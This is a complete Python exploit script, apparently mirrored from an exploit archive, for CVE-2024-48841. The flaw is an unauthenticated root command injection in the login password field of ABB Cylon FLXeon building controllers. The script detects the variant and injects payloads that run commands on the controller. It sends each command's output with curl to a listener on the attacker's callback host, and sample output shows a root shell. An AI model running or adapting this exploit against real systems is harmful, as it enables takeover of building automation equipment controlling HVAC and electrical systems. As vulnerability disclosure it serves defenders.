@@ -1,0 +1,220 @@
+id: 39891
+date: 02/03/2025
+title: ABB Cylon FLXeon 9.3.4 login.js Unauthenticated Root Remote Code Execution Exploit
+author: LiquidWorm
+cves: CVE-2024-48841
+
+#!/usr/bin/env python3
+#
+#
+# ABB Cylon FLXeon 9.3.4 (login.js) Unauthenticated Root Remote Code Execution
+# 
+# 
+# Vendor: ABB Ltd.
+# Product web page: https://www.global.abb
+#                   https://new.abb.com/low-voltage/products/building-automation/product-range/abb-cylon/system-information/portfolio/bacnet-building-control
+#                   https://new.abb.com/low-voltage/products/building-automation/product-range/abb-cylon/products-and-downloads/highlights/flxeon-series
+# Affected version: FLXeon Series (FBXi Series, FBTi Series, FBVi Series)
+#                   CBX Series (FLX Series)
+#                   CBT Series
+#                   CBV Series
+#                   Firmware: <=9.3.4
+# 
+# Summary: BACnet® Smart Building Controllers. ABB's BACnet portfolio features a
+# series of BACnet® IP and BACnet MS/TP field controllers for ASPECT® and INTEGRA™
+# building management solutions. ABB BACnet controllers are designed for intelligent
+# control of HVAC equipment such as central plant, boilers, chillers, cooling towers,
+# heat pump systems, air handling units (constant volume, variable air volume, and
+# multi-zone), rooftop units, electrical systems such as lighting control, variable
+# frequency drives and metering.
+# 
+# The FLXeon Controller Series uses BACnet/IP standards to deliver unprecedented
+# connectivity and open integration for your building automation systems. It's scalable,
+# and modular, allowing you to control a diverse range of HVAC functions.
+# 
+# Desc: The ABB Cylon FLXeon (BACnet) controller suffers from an unauthenticated remote
+# code execution vulnerability with root privileges. Input passed through the login.js
+# script for the password JSON parameter allows out-of-band command injection.
+#
+# ----------------------------------------------------------------------------------
+# $ ./flxroot.py 7.3.3.1 443 7.3.3.2
+# [+] Variant is CBXi, using perl crypto payload.
+# [+] Target is vulnerable!
+# [+] Samo malko potiho!
+# # id;pwd;node -v
+# uid=0(root) gid=0(root) groups=0(root)
+# /home/MIX_CMIX/node-server
+# v8.4.0
+# # exit
+# [+] Sve najbolje!
+# ----------------------------------------------------------------------------------
+# 
+# Tested on: Linux Kernel 5.4.27
+#            Linux Kernel 4.15.13
+#            NodeJS/8.4.0
+#            Express
+# 
+# 
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5907
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5907.php
+# CVE ID: CVE-2024-48841
+# CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48841
+# ABB Advisory:
+# https://search.abb.com/library/Download.aspx?DocumentID=9AKK108470A5684&LanguageCode=en&DocumentPartId=PDF&Action=Launch
+# ABB Technical Bulletin No.546:
+# https://library.e.abb.com/public/10c549147aee4d9b85d0c836cd9eacf7/ABB_Cylon_Bulletin_0546_FBVi_FBTi_FBXi_CBXi_Firmware_v9.3.5.pdf
+#
+#
+# 21.04.2024
+#
+#
+
+import re
+import sys
+import socket
+import requests
+import threading
+
+requests.packages.urllib3.disable_warnings()
+
+proj = r"""
+                 P   R   O   J   E   C   T
+
+                        .|
+                        | |
+                        |'|            ._____
+                ___    |  |            |.   |' .---"|
+        _    .-'   '-. |  |     .--'|  ||   | _|    |
+     .-'|  _.|  |    ||   '-__  |   |  |    ||      |
+     |' | |.    |    ||       | |   |  |    ||      |
+ ____|  '-'     '    ""       '-'   '-.'    '`      |____
+░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ 
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ 
+         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
+         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
+                                         
+            ABB Cylon FLXeon Series <=9.3.4
+       Remote Root Out of Band Command Injection
+                     ZSL-2025-5907
+"""
+
+def usage():
+    print(proj)
+    print("Usage: ./flxroot.py <target_ip> <target_port> <listener_ip>")
+    sys.exit(1)
+
+def ssl(port=5555):
+    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ss.bind(("0.0.0.0", port))
+    ss.listen(5)
+    print(f"[+] Samo malko potiho!")
+
+    while True:
+        try:
+            cs, ca = ss.accept()
+            cs.settimeout(5)
+            data = cs.recv(9876).decode()
+            uam = re.search(r"User-Agent: (.*?)\r\nAccept:", data, re.DOTALL)
+            if uam:
+                curl = uam.group(1).strip()
+                print(curl)
+            else:
+                print("[-] No output.")
+            cs.close()
+        except socket.timeout:
+            print("[-] Socket listener timed out. No data received.")
+        except Exception as e:
+            print(f"[-] Error in socket listener: {e}")
+        finally:
+            continue
+
+def varians(url):
+    try:
+        r = requests.get(url, verify=False)
+        r.raise_for_status()
+        data = r.json()
+        #print("[+] JSON response:", data)
+        variant = data.get("variant", {})
+        variant_value = variant.get("variant")
+        platform_value = variant.get("platform")
+        if variant_value == "CBXi" or platform_value == "CBXi System":
+            print("[+] Variant is CBXi, using perl crypto payload.")
+            return "perl"
+        else:
+            print(f"[+] Variant is {variant_value or platform_value}, using openssl payload.")
+            return "openssl"
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Failed to fetch variant: {e}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Error while processing JSON: {e}")
+        sys.exit(1)
+
+def exploit(url, callback, ptype):
+    while True:
+        try:
+            command = input("# ")
+            if command.lower() in ["exit", "quit"]:
+                print("[+] Sve najbolje!")
+                break
+            if ptype == "perl":
+                inject = f"'\\%22\\';curl -A \"`{command}`\" {callback}:5555;'//"
+            else:
+                inject = f"; curl -A \"`{command}`\" {callback}:5555; #"
+            payload = {
+                "username" : "admin",
+                "password" : inject
+            }
+            r = requests.post(url, json=payload, verify=False, timeout=5)
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Error during exploitation: {e}")
+        except KeyboardInterrupt:
+            print("\n[+] Exiting...")
+            break
+
+def check_vuln(check_it):
+    try:
+        r = requests.get(check_it, verify=False, timeout=5)
+        if r.status_code == 200 and 'ctlmbus' in r.text:
+            print("[+] Target is vulnerable!")
+            return True
+        else:
+            print("[-] Target is not vulnerable!")
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error connecting to the target: {e}")
+        return False
+
+def main():
+    if len(sys.argv) != 4:
+        usage()
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    callback = sys.argv[3]
+    url = f"https://{ip}:{port}/api/login"
+    check_it = url[:-5] + "variant"
+    print(proj)
+    ptype = varians(check_it)
+    if not check_vuln(check_it): sys.exit(1)
+    lt = threading.Thread(target=ssl, daemon=True)
+    lt.start()
+    exploit(url, callback, ptype)
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2025-02-07]  #
